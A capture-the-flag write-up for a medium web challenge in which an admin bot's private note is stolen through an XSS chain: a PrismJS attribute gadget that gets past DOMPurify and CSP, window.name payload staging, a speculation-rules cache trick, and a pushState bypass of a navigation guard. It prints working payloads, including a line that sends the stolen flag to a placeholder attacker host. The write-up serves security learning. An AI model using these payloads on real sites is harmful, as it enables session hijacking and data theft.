# mouse in the house

**Category:** Web | **Difficulty:** Medium | **Points:** 194 | **Flag:** `pwnsec{4f59ed68a68ad767}`

## Challenge Description

> https://www.tiktok.com/@ketnipz/video/7193363887985659142
>
> **- @Macabely**

We get a note-taking website plus an admin bot that visits URLs we submit. The flag lives in a private note that only the bot can read, so the whole game is getting JavaScript to run *as the bot*.

## Initial Analysis

The source has two services:

- `challenge/app-server.js` — an Express notes site. Markdown is rendered with raw HTML enabled, then cleaned with DOMPurify, and every page ships a strict CSP.
- `challenge/bot.js` — a Chromium (Puppeteer) bot. It visits our URL, but first logs into the app with a secret token to get the session that owns the flag note.

On the remote instance the public app was `https://CHALLENGE_HOST` and the bot was the same instance ID with a `bot-` prefix (`https://bot-CHALLENGE_HOST`). The bot's landing page leaks the origin it uses internally: `http://127.0.0.1:3000`. That loopback detail matters later.

**Where's the flag?** At startup the app files the flag away in a note owned by the bot's session:

```js
const flagId = crypto.randomBytes(4).toString("hex");
notes.set(flagId, { owner: BOT_SESSION_ID, title: "flag draft", body: FLAG });
```

Any other session that asks for it gets a 404:

```js
if (note.owner && note.owner !== owner) return res.status(404).send("not found");
```

So guessing the random 8-hex-char ID isn't enough — we need code running inside the bot's authenticated session.

**The defenses.** Note bodies pass through DOMPurify and this CSP:

```
default-src 'none';
script-src 'self' https://esm.sh/gh/PrismJS/prism@36ad7f8/ 'nonce-...' data:;
style-src 'nonce-...';
connect-src http://127.0.0.1:3000/notes/;
form-action 'self'; base-uri 'none';
sandbox allow-scripts allow-same-origin
```

DOMPurify strips `<script>` and `onerror=`, and the CSP blocks inline scripts anyway. But two things stand out: the CSP allows scripts from `data:` URLs, and **every note loads PrismJS** as a trusted module.

The bot also tries to stop exfiltration by blocking external main-frame navigations *while it is sitting on a note*:

```js
const externalNavigation = page.url().startsWith(`${APP_ORIGIN}/notes/`)
  && request.isNavigationRequest()
  && request.frame() === page.mainFrame()
  && new URL(request.url()).origin !== APP_ORIGIN;
```

## The Vulnerability

No single bug hands over the flag — it's a chain of reasonable-looking decisions that combine badly:

1. **DOMPurify keeps `data-*` attributes.** Normally harmless.
2. **PrismJS treats `data-prism-*` attributes as config.** Prism reads attributes like `data-prism-plugins` and `data-prism-plugin-path`, then dynamically imports a module: roughly `import(pluginPath + id + ".js")`. Because `pluginPath` is attacker-controlled and the CSP allows `data:`, we can make Prism import a `data:` URL that *is* JavaScript.
3. **The note limit is only 80 chars**, but `window.name` survives cross-origin navigation and can carry the real payload.
4. **The search page leaks all the bot's note IDs**, and its Fetch-Metadata guard can be sidestepped with a speculation-rules prefetch read back from cache.
5. **The bot's nav guard trusts the URL string**, which `history.pushState()` can rewrite without actually leaving the page.

### The Prism gadget

The malicious note body (78 chars, under the 80 limit):

```html
<a data-prism-plugins data-prism-plugin-path=data:text/jscript,import(name)//>
```

Empty `data-prism-plugins` parses as one empty plugin id, so Prism builds:

```
data:text/jscript,import(name)//.js
```

Everything after `//` is a JS comment, leaving just `import(name)`. (`text/jscript` is an accepted JS MIME type and two chars shorter than `text/javascript` — which matters when you're fighting a character limit.) Now we just need `window.name` to hold the real code.

## Exploitation

Full solver: [`solve.py`](solve.py). The flow:

**1. Stash the big payload in `window.name`, then redirect to the gadget note.** The bot's *first* navigation is to our page (allowed, because it isn't on `/notes/` yet). Our page does:

```html
<!doctype html><title>a</title><script>
window.name = "data:text/javascript,<url-encoded stage 2>";
location = "http://127.0.0.1:3000/notes/<GADGET_ID>";
</script>
```

The redirect is a top-level GET, so the bot's `SameSite=Lax` cookie rides along and the note loads in the bot's session. Prism fires `import(name)` and our stage-2 module runs.

**2. Stage 2 — find the flag note ID.** The search endpoint returns every note the session can see, but it demands a navigation-style request (`Sec-Fetch-Mode: navigate`). A plain `fetch()` from the loopback origin sends `Sec-Fetch-Mode: cors` and gets rejected. Trick: register a **speculation-rules prefetch** (allowed by the nonce) for `/notes/?search=`, which the browser fetches as a document and caches, then read it back with `cache: 'only-if-cached'`:

```js
const s = document.createElement('script');
s.type = 'speculationrules';
s.nonce = document.scripts[0].nonce;
s.text = JSON.stringify({ prefetch: [{ source: 'list', urls: ['/notes/?search='] }] });
document.head.append(s);
await new Promise(r => setTimeout(r, 2500));
const html = await (await fetch('/notes/?search=', { cache: 'only-if-cached', mode: 'same-origin' })).text();
const ids = [...new Set([...html.matchAll(/\/notes\/([a-f0-9]{8})/g)].map(m => m[1]))];
```

**3. Read each note, grab the flag.** These `fetch('/notes/<id>')` calls are allowed by the `connect-src` rule:

```js
for (const id of ids) {
  const note = await (await fetch('/notes/' + id)).text();
  const m = note.match(/(pwnsec|flag|PWNSEC|CTF)\{[^}]*\}/);
  if (m) { flag = m[0]; break; }
}
```

**4. Escape the nav guard and exfiltrate.** The flag is in memory, but `connect-src` won't let us POST it out, and a direct external navigation is blocked while the URL starts with `/notes/`. So we lie about the URL:

```js
history.pushState(0, 0, '/');               // page.url() no longer starts with /notes/
location = 'https://ATTACKER/log?f=' + encodeURIComponent(flag);
```

The document and its JS keep running, but the guard's `startsWith(APP_ORIGIN + '/notes/')` is now false, so the navigation goes through.

**Running it.** `solve.py` creates the gadget note (supplying `Sec-Fetch-Mode: navigate`), serves the staging + `/log` pages, and submits the attacker URL to `/visit`. The writeup used a Cloudflare tunnel to expose the local callback server to the remote bot.

## Flag

```
pwnsec{4f59ed68a68ad767}
```

The callback landed as `GET /log?f=pwnsec%7B4f59ed68a68ad767%7D`.

## Key Takeaways

- **A trusted third-party script can become your XSS gadget.** DOMPurify + CSP looked airtight, but PrismJS turning `data-prism-*` attributes into a dynamic `import()` punched right through — especially with `data:` allowed in `script-src`.
- **`window.name` beats tiny input limits.** It persists across navigations (even cross-origin), so an 80-char note can bootstrap an arbitrarily large payload.
- **Fetch-Metadata is not authorization.** A speculation-rules prefetch read back from cache produced a navigation-shaped response without a real navigation.
- **Don't trust `page.url()` for a security decision** — `history.pushState()` rewrites it without navigating. Allowlist the destination origin instead.
